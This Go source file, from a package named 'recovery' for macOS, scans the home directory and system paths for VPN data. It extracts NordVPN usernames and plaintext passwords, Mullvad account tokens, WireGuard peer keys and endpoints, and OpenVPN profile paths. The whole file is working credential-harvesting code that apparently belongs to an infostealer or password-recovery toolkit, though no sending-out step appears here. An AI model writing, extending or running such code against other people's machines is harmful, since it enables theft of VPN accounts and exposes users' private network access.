//go:build darwin

package recovery

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"recovery/recovery/types"
)

func ScanVPNs() *types.VPNResult {
	result := &types.VPNResult{
		NordVPN:   scanNordVPNDarwin(),
		WireGuard: scanWireGuardDarwin(),
		OpenVPN:   scanOpenVPNDarwin(),
		Mullvad:   scanMullvadDarwin(),
	}
	if len(result.NordVPN) == 0 && len(result.WireGuard) == 0 && len(result.OpenVPN) == 0 && len(result.Mullvad) == 0 {
		return nil
	}
	return result
}

func scanNordVPNDarwin() []types.NordVPNResult {
	var results []types.NordVPNResult
	home, _ := os.UserHomeDir()
	if home == "" {
		return nil
	}

	dirs := []string{
		filepath.Join(home, "Library", "Application Support", "NordVPN"),
		filepath.Join(home, "Library", "Containers", "com.nordvpn.NordVPN", "Data", "Library", "Application Support", "NordVPN"),
	}

	for _, nordDir := range dirs {
		if !pathExists(nordDir) {
			continue
		}
		filepath.Walk(nordDir, func(path string, info os.FileInfo, err error) error {
			if err != nil || info.IsDir() {
				return nil
			}
			name := strings.ToLower(info.Name())
			if name != "user.config" && name != "nordvpn.config" && !strings.HasSuffix(name, ".plist") {
				return nil
			}
			data, err := os.ReadFile(path)
			if err != nil || len(data) == 0 {
				return nil
			}
			username := extractNordVPNValueDarwin(data, "Username")
			password := extractNordVPNValueDarwin(data, "Password")
			if username != "" && password != "" {
				results = append(results, types.NordVPNResult{
					Version:  filepath.Base(filepath.Dir(path)),
					Username: username,
					Password: password,
				})
			}
			return nil
		})
	}

	return results
}

func extractNordVPNValueDarwin(data []byte, field string) string {
	content := string(data)
	idx := strings.Index(content, `name="`+field+`"`)
	if idx == -1 {
		idx = strings.Index(content, `<key>`+field+`</key>`)
		if idx != -1 {
			start := strings.Index(content[idx:], "<string>")
			end := strings.Index(content[idx:], "</string>")
			if start != -1 && end != -1 && end > start {
				return strings.TrimSpace(content[idx+start+8 : idx+end])
			}
		}
		return ""
	}

	start := strings.Index(content[idx:], "<value>")
	end := strings.Index(content[idx:], "</value>")
	if start == -1 || end == -1 || end < start {
		return ""
	}
	return strings.TrimSpace(content[idx+start+7 : idx+end])
}

func scanWireGuardDarwin() []types.WireGuardResult {
	var results []types.WireGuardResult
	home, _ := os.UserHomeDir()

	configDirs := []string{
		"/etc/wireguard",
		"/usr/local/etc/wireguard",
		"/opt/homebrew/etc/wireguard",
	}
	if home != "" {
		configDirs = append(configDirs, filepath.Join(home, ".config", "wireguard"))
	}

	for _, configDir := range configDirs {
		if !pathExists(configDir) {
			continue
		}
		entries, err := os.ReadDir(configDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".conf") {
				continue
			}
			confData, err := os.ReadFile(filepath.Join(configDir, e.Name()))
			if err != nil || len(confData) == 0 {
				continue
			}
			var iface, peer, endpoint string
			for _, line := range strings.Split(string(confData), "\n") {
				line = strings.TrimSpace(line)
				if key, val, ok := strings.Cut(line, "="); ok {
					key = strings.TrimSpace(key)
					val = strings.TrimSpace(val)
					switch key {
					case "Address":
						iface = val
					case "Endpoint":
						endpoint = val
					case "PublicKey":
						if peer == "" {
							peer = val
						}
					}
				}
			}
			results = append(results, types.WireGuardResult{
				Name:      e.Name(),
				Interface: iface,
				Peer:      peer,
				Endpoint:  endpoint,
			})
		}
	}
	return results
}

func scanOpenVPNDarwin() []types.OpenVPNResult {
	var results []types.OpenVPNResult
	home, _ := os.UserHomeDir()
	ovpnDirs := []string{"/etc/openvpn", "/etc/openvpn/client"}
	if home != "" {
		ovpnDirs = append(ovpnDirs,
			filepath.Join(home, ".config", "openvpn"),
			filepath.Join(home, "OpenVPN", "config"),
			filepath.Join(home, "Library", "Application Support", "OpenVPN Connect", "profiles"),
			filepath.Join(home, "Library", "Application Support", "Tunnelblick", "Configurations"),
		)
	}

	for _, ovpnDir := range ovpnDirs {
		if !pathExists(ovpnDir) {
			continue
		}
		entries, err := os.ReadDir(ovpnDir)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".ovpn") {
				continue
			}
			results = append(results, types.OpenVPNResult{
				Name: e.Name(),
				Path: filepath.Join(ovpnDir, e.Name()),
			})
		}
	}
	return results
}

func scanMullvadDarwin() []types.MullvadResult {
	var results []types.MullvadResult
	home, _ := os.UserHomeDir()
	configDirs := []string{"/etc/mullvad-vpn"}
	if home != "" {
		configDirs = append(configDirs, filepath.Join(home, "Library", "Application Support", "Mullvad VPN"))
	}

	for _, dir := range configDirs {
		if !pathExists(dir) {
			continue
		}
		for _, name := range []string{"settings.json", "account-history.json", "account-token.json"} {
			path := filepath.Join(dir, name)
			data, err := os.ReadFile(path)
			if err != nil || len(data) == 0 {
				continue
			}
			var raw map[string]json.RawMessage
			if json.Unmarshal(data, &raw) != nil {
				var token string
				if json.Unmarshal(data, &token) == nil && token != "" && !mullvadAlreadyFoundDarwin(results, token) {
					results = append(results, types.MullvadResult{AccountNumber: token, SettingsPath: path})
				}
				continue
			}
			for _, key := range []string{"account_token", "accountToken", "account_number", "account"} {
				v, ok := raw[key]
				if !ok {
					continue
				}
				var token string
				if json.Unmarshal(v, &token) == nil && token != "" && !mullvadAlreadyFoundDarwin(results, token) {
					results = append(results, types.MullvadResult{AccountNumber: token, SettingsPath: path})
					break
				}
			}
		}
	}
	return results
}

func mullvadAlreadyFoundDarwin(results []types.MullvadResult, account string) bool {
	for _, r := range results {
		if r.AccountNumber == account {
			return true
		}
	}
	return false
}